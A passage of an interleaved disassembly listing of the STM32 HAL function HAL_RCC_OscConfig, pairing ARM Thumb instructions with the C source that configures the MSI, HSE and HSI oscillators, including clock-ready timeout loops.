 80038dc:	4b88      	ldr	r3, [pc, #544]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 80038de:	681b      	ldr	r3, [r3, #0]
 80038e0:	f003 0302 	and.w	r3, r3, #2
 80038e4:	2b00      	cmp	r3, #0
 80038e6:	d005      	beq.n	80038f4 <HAL_RCC_OscConfig+0x64>
 80038e8:	687b      	ldr	r3, [r7, #4]
 80038ea:	699b      	ldr	r3, [r3, #24]
 80038ec:	2b00      	cmp	r3, #0
 80038ee:	d101      	bne.n	80038f4 <HAL_RCC_OscConfig+0x64>
      {
        return HAL_ERROR;
 80038f0:	2301      	movs	r3, #1
 80038f2:	e3d9      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
      else
      {
        /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
           must be correctly programmed according to the frequency of the CPU clock
           (HCLK) and the supply voltage of the device. */
        if(RCC_OscInitStruct->MSIClockRange > __HAL_RCC_GET_MSI_RANGE())
 80038f4:	687b      	ldr	r3, [r7, #4]
 80038f6:	6a1a      	ldr	r2, [r3, #32]
 80038f8:	4b81      	ldr	r3, [pc, #516]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 80038fa:	681b      	ldr	r3, [r3, #0]
 80038fc:	f003 0308 	and.w	r3, r3, #8
 8003900:	2b00      	cmp	r3, #0
 8003902:	d004      	beq.n	800390e <HAL_RCC_OscConfig+0x7e>
 8003904:	4b7e      	ldr	r3, [pc, #504]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003906:	681b      	ldr	r3, [r3, #0]
 8003908:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 800390c:	e005      	b.n	800391a <HAL_RCC_OscConfig+0x8a>
 800390e:	4b7c      	ldr	r3, [pc, #496]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003910:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003914:	091b      	lsrs	r3, r3, #4
 8003916:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 800391a:	4293      	cmp	r3, r2
 800391c:	d223      	bcs.n	8003966 <HAL_RCC_OscConfig+0xd6>
        {
          /* First increase number of wait states update if necessary */
          if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 800391e:	687b      	ldr	r3, [r7, #4]
 8003920:	6a1b      	ldr	r3, [r3, #32]
 8003922:	4618      	mov	r0, r3
 8003924:	f000 fd8c 	bl	8004440 <RCC_SetFlashLatencyFromMSIRange>
 8003928:	4603      	mov	r3, r0
 800392a:	2b00      	cmp	r3, #0
 800392c:	d001      	beq.n	8003932 <HAL_RCC_OscConfig+0xa2>
          {
            return HAL_ERROR;
 800392e:	2301      	movs	r3, #1
 8003930:	e3ba      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
          }

          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003932:	4b73      	ldr	r3, [pc, #460]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003934:	681b      	ldr	r3, [r3, #0]
 8003936:	4a72      	ldr	r2, [pc, #456]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003938:	f043 0308 	orr.w	r3, r3, #8
 800393c:	6013      	str	r3, [r2, #0]
 800393e:	4b70      	ldr	r3, [pc, #448]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003940:	681b      	ldr	r3, [r3, #0]
 8003942:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003946:	687b      	ldr	r3, [r7, #4]
 8003948:	6a1b      	ldr	r3, [r3, #32]
 800394a:	496d      	ldr	r1, [pc, #436]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 800394c:	4313      	orrs	r3, r2
 800394e:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003950:	4b6b      	ldr	r3, [pc, #428]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003952:	685b      	ldr	r3, [r3, #4]
 8003954:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003958:	687b      	ldr	r3, [r7, #4]
 800395a:	69db      	ldr	r3, [r3, #28]
 800395c:	021b      	lsls	r3, r3, #8
 800395e:	4968      	ldr	r1, [pc, #416]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003960:	4313      	orrs	r3, r2
 8003962:	604b      	str	r3, [r1, #4]
 8003964:	e025      	b.n	80039b2 <HAL_RCC_OscConfig+0x122>
        }
        else
        {
          /* Else, keep current flash latency while decreasing applies */
          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003966:	4b66      	ldr	r3, [pc, #408]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003968:	681b      	ldr	r3, [r3, #0]
 800396a:	4a65      	ldr	r2, [pc, #404]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 800396c:	f043 0308 	orr.w	r3, r3, #8
 8003970:	6013      	str	r3, [r2, #0]
 8003972:	4b63      	ldr	r3, [pc, #396]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003974:	681b      	ldr	r3, [r3, #0]
 8003976:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 800397a:	687b      	ldr	r3, [r7, #4]
 800397c:	6a1b      	ldr	r3, [r3, #32]
 800397e:	4960      	ldr	r1, [pc, #384]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003980:	4313      	orrs	r3, r2
 8003982:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003984:	4b5e      	ldr	r3, [pc, #376]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003986:	685b      	ldr	r3, [r3, #4]
 8003988:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 800398c:	687b      	ldr	r3, [r7, #4]
 800398e:	69db      	ldr	r3, [r3, #28]
 8003990:	021b      	lsls	r3, r3, #8
 8003992:	495b      	ldr	r1, [pc, #364]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003994:	4313      	orrs	r3, r2
 8003996:	604b      	str	r3, [r1, #4]

          /* Decrease number of wait states update if necessary */
          /* Only possible when MSI is the System clock source  */
          if(sysclk_source == RCC_CFGR_SWS_MSI)
 8003998:	69bb      	ldr	r3, [r7, #24]
 800399a:	2b00      	cmp	r3, #0
 800399c:	d109      	bne.n	80039b2 <HAL_RCC_OscConfig+0x122>
          {
            if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 800399e:	687b      	ldr	r3, [r7, #4]
 80039a0:	6a1b      	ldr	r3, [r3, #32]
 80039a2:	4618      	mov	r0, r3
 80039a4:	f000 fd4c 	bl	8004440 <RCC_SetFlashLatencyFromMSIRange>
 80039a8:	4603      	mov	r3, r0
 80039aa:	2b00      	cmp	r3, #0
 80039ac:	d001      	beq.n	80039b2 <HAL_RCC_OscConfig+0x122>
            {
              return HAL_ERROR;
 80039ae:	2301      	movs	r3, #1
 80039b0:	e37a      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
            }
          }
        }

        /* Update the SystemCoreClock global variable */
        SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 80039b2:	f000 fc81 	bl	80042b8 <HAL_RCC_GetSysClockFreq>
 80039b6:	4602      	mov	r2, r0
 80039b8:	4b51      	ldr	r3, [pc, #324]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 80039ba:	689b      	ldr	r3, [r3, #8]
 80039bc:	091b      	lsrs	r3, r3, #4
 80039be:	f003 030f 	and.w	r3, r3, #15
 80039c2:	4950      	ldr	r1, [pc, #320]	; (8003b04 <HAL_RCC_OscConfig+0x274>)
 80039c4:	5ccb      	ldrb	r3, [r1, r3]
 80039c6:	f003 031f 	and.w	r3, r3, #31
 80039ca:	fa22 f303 	lsr.w	r3, r2, r3
 80039ce:	4a4e      	ldr	r2, [pc, #312]	; (8003b08 <HAL_RCC_OscConfig+0x278>)
 80039d0:	6013      	str	r3, [r2, #0]

        /* Configure the source of time base considering new system clocks settings*/
        status = HAL_InitTick(uwTickPrio);
 80039d2:	4b4e      	ldr	r3, [pc, #312]	; (8003b0c <HAL_RCC_OscConfig+0x27c>)
 80039d4:	681b      	ldr	r3, [r3, #0]
 80039d6:	4618      	mov	r0, r3
 80039d8:	f7fd fb86 	bl	80010e8 <HAL_InitTick>
 80039dc:	4603      	mov	r3, r0
 80039de:	73fb      	strb	r3, [r7, #15]
        if(status != HAL_OK)
 80039e0:	7bfb      	ldrb	r3, [r7, #15]
 80039e2:	2b00      	cmp	r3, #0
 80039e4:	d052      	beq.n	8003a8c <HAL_RCC_OscConfig+0x1fc>
        {
          return status;
 80039e6:	7bfb      	ldrb	r3, [r7, #15]
 80039e8:	e35e      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Check the MSI State */
      if(RCC_OscInitStruct->MSIState != RCC_MSI_OFF)
 80039ea:	687b      	ldr	r3, [r7, #4]
 80039ec:	699b      	ldr	r3, [r3, #24]
 80039ee:	2b00      	cmp	r3, #0
 80039f0:	d032      	beq.n	8003a58 <HAL_RCC_OscConfig+0x1c8>
      {
        /* Enable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_ENABLE();
 80039f2:	4b43      	ldr	r3, [pc, #268]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 80039f4:	681b      	ldr	r3, [r3, #0]
 80039f6:	4a42      	ldr	r2, [pc, #264]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 80039f8:	f043 0301 	orr.w	r3, r3, #1
 80039fc:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 80039fe:	f7fd fbc3 	bl	8001188 <HAL_GetTick>
 8003a02:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003a04:	e008      	b.n	8003a18 <HAL_RCC_OscConfig+0x188>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003a06:	f7fd fbbf 	bl	8001188 <HAL_GetTick>
 8003a0a:	4602      	mov	r2, r0
 8003a0c:	693b      	ldr	r3, [r7, #16]
 8003a0e:	1ad3      	subs	r3, r2, r3
 8003a10:	2b02      	cmp	r3, #2
 8003a12:	d901      	bls.n	8003a18 <HAL_RCC_OscConfig+0x188>
          {
            return HAL_TIMEOUT;
 8003a14:	2303      	movs	r3, #3
 8003a16:	e347      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003a18:	4b39      	ldr	r3, [pc, #228]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003a1a:	681b      	ldr	r3, [r3, #0]
 8003a1c:	f003 0302 	and.w	r3, r3, #2
 8003a20:	2b00      	cmp	r3, #0
 8003a22:	d0f0      	beq.n	8003a06 <HAL_RCC_OscConfig+0x176>
          }
        }
         /* Selects the Multiple Speed oscillator (MSI) clock range .*/
        __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003a24:	4b36      	ldr	r3, [pc, #216]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003a26:	681b      	ldr	r3, [r3, #0]
 8003a28:	4a35      	ldr	r2, [pc, #212]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003a2a:	f043 0308 	orr.w	r3, r3, #8
 8003a2e:	6013      	str	r3, [r2, #0]
 8003a30:	4b33      	ldr	r3, [pc, #204]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003a32:	681b      	ldr	r3, [r3, #0]
 8003a34:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003a38:	687b      	ldr	r3, [r7, #4]
 8003a3a:	6a1b      	ldr	r3, [r3, #32]
 8003a3c:	4930      	ldr	r1, [pc, #192]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003a3e:	4313      	orrs	r3, r2
 8003a40:	600b      	str	r3, [r1, #0]
         /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
        __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003a42:	4b2f      	ldr	r3, [pc, #188]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003a44:	685b      	ldr	r3, [r3, #4]
 8003a46:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003a4a:	687b      	ldr	r3, [r7, #4]
 8003a4c:	69db      	ldr	r3, [r3, #28]
 8003a4e:	021b      	lsls	r3, r3, #8
 8003a50:	492b      	ldr	r1, [pc, #172]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003a52:	4313      	orrs	r3, r2
 8003a54:	604b      	str	r3, [r1, #4]
 8003a56:	e01a      	b.n	8003a8e <HAL_RCC_OscConfig+0x1fe>

      }
      else
      {
        /* Disable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_DISABLE();
 8003a58:	4b29      	ldr	r3, [pc, #164]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003a5a:	681b      	ldr	r3, [r3, #0]
 8003a5c:	4a28      	ldr	r2, [pc, #160]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003a5e:	f023 0301 	bic.w	r3, r3, #1
 8003a62:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 8003a64:	f7fd fb90 	bl	8001188 <HAL_GetTick>
 8003a68:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003a6a:	e008      	b.n	8003a7e <HAL_RCC_OscConfig+0x1ee>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003a6c:	f7fd fb8c 	bl	8001188 <HAL_GetTick>
 8003a70:	4602      	mov	r2, r0
 8003a72:	693b      	ldr	r3, [r7, #16]
 8003a74:	1ad3      	subs	r3, r2, r3
 8003a76:	2b02      	cmp	r3, #2
 8003a78:	d901      	bls.n	8003a7e <HAL_RCC_OscConfig+0x1ee>
          {
            return HAL_TIMEOUT;
 8003a7a:	2303      	movs	r3, #3
 8003a7c:	e314      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003a7e:	4b20      	ldr	r3, [pc, #128]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003a80:	681b      	ldr	r3, [r3, #0]
 8003a82:	f003 0302 	and.w	r3, r3, #2
 8003a86:	2b00      	cmp	r3, #0
 8003a88:	d1f0      	bne.n	8003a6c <HAL_RCC_OscConfig+0x1dc>
 8003a8a:	e000      	b.n	8003a8e <HAL_RCC_OscConfig+0x1fe>
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 8003a8c:	bf00      	nop
        }
      }
    }
  }
  /*------------------------------- HSE Configuration ------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSE) == RCC_OSCILLATORTYPE_HSE)
 8003a8e:	687b      	ldr	r3, [r7, #4]
 8003a90:	681b      	ldr	r3, [r3, #0]
 8003a92:	f003 0301 	and.w	r3, r3, #1
 8003a96:	2b00      	cmp	r3, #0
 8003a98:	d073      	beq.n	8003b82 <HAL_RCC_OscConfig+0x2f2>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSE(RCC_OscInitStruct->HSEState));

    /* When the HSE is used as system clock or clock source for PLL in these cases it is not allowed to be disabled */
    if((sysclk_source == RCC_CFGR_SWS_HSE) ||
 8003a9a:	69bb      	ldr	r3, [r7, #24]
 8003a9c:	2b08      	cmp	r3, #8
 8003a9e:	d005      	beq.n	8003aac <HAL_RCC_OscConfig+0x21c>
 8003aa0:	69bb      	ldr	r3, [r7, #24]
 8003aa2:	2b0c      	cmp	r3, #12
 8003aa4:	d10e      	bne.n	8003ac4 <HAL_RCC_OscConfig+0x234>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSE)))
 8003aa6:	697b      	ldr	r3, [r7, #20]
 8003aa8:	2b03      	cmp	r3, #3
 8003aaa:	d10b      	bne.n	8003ac4 <HAL_RCC_OscConfig+0x234>
    {
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003aac:	4b14      	ldr	r3, [pc, #80]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003aae:	681b      	ldr	r3, [r3, #0]
 8003ab0:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003ab4:	2b00      	cmp	r3, #0
 8003ab6:	d063      	beq.n	8003b80 <HAL_RCC_OscConfig+0x2f0>
 8003ab8:	687b      	ldr	r3, [r7, #4]
 8003aba:	685b      	ldr	r3, [r3, #4]
 8003abc:	2b00      	cmp	r3, #0
 8003abe:	d15f      	bne.n	8003b80 <HAL_RCC_OscConfig+0x2f0>
      {
        return HAL_ERROR;
 8003ac0:	2301      	movs	r3, #1
 8003ac2:	e2f1      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Set the new HSE configuration ---------------------------------------*/
      __HAL_RCC_HSE_CONFIG(RCC_OscInitStruct->HSEState);
 8003ac4:	687b      	ldr	r3, [r7, #4]
 8003ac6:	685b      	ldr	r3, [r3, #4]
 8003ac8:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8003acc:	d106      	bne.n	8003adc <HAL_RCC_OscConfig+0x24c>
 8003ace:	4b0c      	ldr	r3, [pc, #48]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003ad0:	681b      	ldr	r3, [r3, #0]
 8003ad2:	4a0b      	ldr	r2, [pc, #44]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003ad4:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003ad8:	6013      	str	r3, [r2, #0]
 8003ada:	e025      	b.n	8003b28 <HAL_RCC_OscConfig+0x298>
 8003adc:	687b      	ldr	r3, [r7, #4]
 8003ade:	685b      	ldr	r3, [r3, #4]
 8003ae0:	f5b3 2fa0 	cmp.w	r3, #327680	; 0x50000
 8003ae4:	d114      	bne.n	8003b10 <HAL_RCC_OscConfig+0x280>
 8003ae6:	4b06      	ldr	r3, [pc, #24]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003ae8:	681b      	ldr	r3, [r3, #0]
 8003aea:	4a05      	ldr	r2, [pc, #20]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003aec:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 8003af0:	6013      	str	r3, [r2, #0]
 8003af2:	4b03      	ldr	r3, [pc, #12]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003af4:	681b      	ldr	r3, [r3, #0]
 8003af6:	4a02      	ldr	r2, [pc, #8]	; (8003b00 <HAL_RCC_OscConfig+0x270>)
 8003af8:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003afc:	6013      	str	r3, [r2, #0]
 8003afe:	e013      	b.n	8003b28 <HAL_RCC_OscConfig+0x298>
 8003b00:	40021000 	.word	0x40021000
 8003b04:	0800d16c 	.word	0x0800d16c
 8003b08:	20000000 	.word	0x20000000
 8003b0c:	20000004 	.word	0x20000004
 8003b10:	4ba0      	ldr	r3, [pc, #640]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003b12:	681b      	ldr	r3, [r3, #0]
 8003b14:	4a9f      	ldr	r2, [pc, #636]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003b16:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8003b1a:	6013      	str	r3, [r2, #0]
 8003b1c:	4b9d      	ldr	r3, [pc, #628]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003b1e:	681b      	ldr	r3, [r3, #0]
 8003b20:	4a9c      	ldr	r2, [pc, #624]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003b22:	f423 2380 	bic.w	r3, r3, #262144	; 0x40000
 8003b26:	6013      	str	r3, [r2, #0]

      /* Check the HSE State */
      if(RCC_OscInitStruct->HSEState != RCC_HSE_OFF)
 8003b28:	687b      	ldr	r3, [r7, #4]
 8003b2a:	685b      	ldr	r3, [r3, #4]
 8003b2c:	2b00      	cmp	r3, #0
 8003b2e:	d013      	beq.n	8003b58 <HAL_RCC_OscConfig+0x2c8>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003b30:	f7fd fb2a 	bl	8001188 <HAL_GetTick>
 8003b34:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003b36:	e008      	b.n	8003b4a <HAL_RCC_OscConfig+0x2ba>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003b38:	f7fd fb26 	bl	8001188 <HAL_GetTick>
 8003b3c:	4602      	mov	r2, r0
 8003b3e:	693b      	ldr	r3, [r7, #16]
 8003b40:	1ad3      	subs	r3, r2, r3
 8003b42:	2b64      	cmp	r3, #100	; 0x64
 8003b44:	d901      	bls.n	8003b4a <HAL_RCC_OscConfig+0x2ba>
          {
            return HAL_TIMEOUT;
 8003b46:	2303      	movs	r3, #3
 8003b48:	e2ae      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003b4a:	4b92      	ldr	r3, [pc, #584]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003b4c:	681b      	ldr	r3, [r3, #0]
 8003b4e:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003b52:	2b00      	cmp	r3, #0
 8003b54:	d0f0      	beq.n	8003b38 <HAL_RCC_OscConfig+0x2a8>
 8003b56:	e014      	b.n	8003b82 <HAL_RCC_OscConfig+0x2f2>
        }
      }
      else
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003b58:	f7fd fb16 	bl	8001188 <HAL_GetTick>
 8003b5c:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003b5e:	e008      	b.n	8003b72 <HAL_RCC_OscConfig+0x2e2>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003b60:	f7fd fb12 	bl	8001188 <HAL_GetTick>
 8003b64:	4602      	mov	r2, r0
 8003b66:	693b      	ldr	r3, [r7, #16]
 8003b68:	1ad3      	subs	r3, r2, r3
 8003b6a:	2b64      	cmp	r3, #100	; 0x64
 8003b6c:	d901      	bls.n	8003b72 <HAL_RCC_OscConfig+0x2e2>
          {
            return HAL_TIMEOUT;
 8003b6e:	2303      	movs	r3, #3
 8003b70:	e29a      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003b72:	4b88      	ldr	r3, [pc, #544]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003b74:	681b      	ldr	r3, [r3, #0]
 8003b76:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003b7a:	2b00      	cmp	r3, #0
 8003b7c:	d1f0      	bne.n	8003b60 <HAL_RCC_OscConfig+0x2d0>
 8003b7e:	e000      	b.n	8003b82 <HAL_RCC_OscConfig+0x2f2>
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003b80:	bf00      	nop
        }
      }
    }
  }
  /*----------------------------- HSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI) == RCC_OSCILLATORTYPE_HSI)
 8003b82:	687b      	ldr	r3, [r7, #4]
 8003b84:	681b      	ldr	r3, [r3, #0]
 8003b86:	f003 0302 	and.w	r3, r3, #2
 8003b8a:	2b00      	cmp	r3, #0
 8003b8c:	d060      	beq.n	8003c50 <HAL_RCC_OscConfig+0x3c0>
    /* Check the parameters */
    assert_param(IS_RCC_HSI(RCC_OscInitStruct->HSIState));
    assert_param(IS_RCC_HSI_CALIBRATION_VALUE(RCC_OscInitStruct->HSICalibrationValue));

    /* Check if HSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_HSI) ||
 8003b8e:	69bb      	ldr	r3, [r7, #24]
 8003b90:	2b04      	cmp	r3, #4
 8003b92:	d005      	beq.n	8003ba0 <HAL_RCC_OscConfig+0x310>
 8003b94:	69bb      	ldr	r3, [r7, #24]
 8003b96:	2b0c      	cmp	r3, #12
 8003b98:	d119      	bne.n	8003bce <HAL_RCC_OscConfig+0x33e>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSI)))
 8003b9a:	697b      	ldr	r3, [r7, #20]
 8003b9c:	2b02      	cmp	r3, #2
 8003b9e:	d116      	bne.n	8003bce <HAL_RCC_OscConfig+0x33e>
    {
      /* When HSI is used as system clock it will not be disabled */
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003ba0:	4b7c      	ldr	r3, [pc, #496]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003ba2:	681b      	ldr	r3, [r3, #0]
 8003ba4:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003ba8:	2b00      	cmp	r3, #0
 8003baa:	d005      	beq.n	8003bb8 <HAL_RCC_OscConfig+0x328>
 8003bac:	687b      	ldr	r3, [r7, #4]
 8003bae:	68db      	ldr	r3, [r3, #12]
 8003bb0:	2b00      	cmp	r3, #0
 8003bb2:	d101      	bne.n	8003bb8 <HAL_RCC_OscConfig+0x328>
      {
        return HAL_ERROR;
 8003bb4:	2301      	movs	r3, #1
 8003bb6:	e277      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
      }
      /* Otherwise, just the calibration is allowed */
      else
      {
        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003bb8:	4b76      	ldr	r3, [pc, #472]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003bba:	685b      	ldr	r3, [r3, #4]
 8003bbc:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003bc0:	687b      	ldr	r3, [r7, #4]
 8003bc2:	691b      	ldr	r3, [r3, #16]
 8003bc4:	061b      	lsls	r3, r3, #24
 8003bc6:	4973      	ldr	r1, [pc, #460]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003bc8:	4313      	orrs	r3, r2
 8003bca:	604b      	str	r3, [r1, #4]
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003bcc:	e040      	b.n	8003c50 <HAL_RCC_OscConfig+0x3c0>
      }
    }
    else
    {
      /* Check the HSI State */
      if(RCC_OscInitStruct->HSIState != RCC_HSI_OFF)
 8003bce:	687b      	ldr	r3, [r7, #4]
 8003bd0:	68db      	ldr	r3, [r3, #12]
 8003bd2:	2b00      	cmp	r3, #0
 8003bd4:	d023      	beq.n	8003c1e <HAL_RCC_OscConfig+0x38e>
      {
        /* Enable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_ENABLE();
 8003bd6:	4b6f      	ldr	r3, [pc, #444]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003bd8:	681b      	ldr	r3, [r3, #0]
 8003bda:	4a6e      	ldr	r2, [pc, #440]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003bdc:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003be0:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003be2:	f7fd fad1 	bl	8001188 <HAL_GetTick>
 8003be6:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003be8:	e008      	b.n	8003bfc <HAL_RCC_OscConfig+0x36c>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003bea:	f7fd facd 	bl	8001188 <HAL_GetTick>
 8003bee:	4602      	mov	r2, r0
 8003bf0:	693b      	ldr	r3, [r7, #16]
 8003bf2:	1ad3      	subs	r3, r2, r3
 8003bf4:	2b02      	cmp	r3, #2
 8003bf6:	d901      	bls.n	8003bfc <HAL_RCC_OscConfig+0x36c>
          {
            return HAL_TIMEOUT;
 8003bf8:	2303      	movs	r3, #3
 8003bfa:	e255      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003bfc:	4b65      	ldr	r3, [pc, #404]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
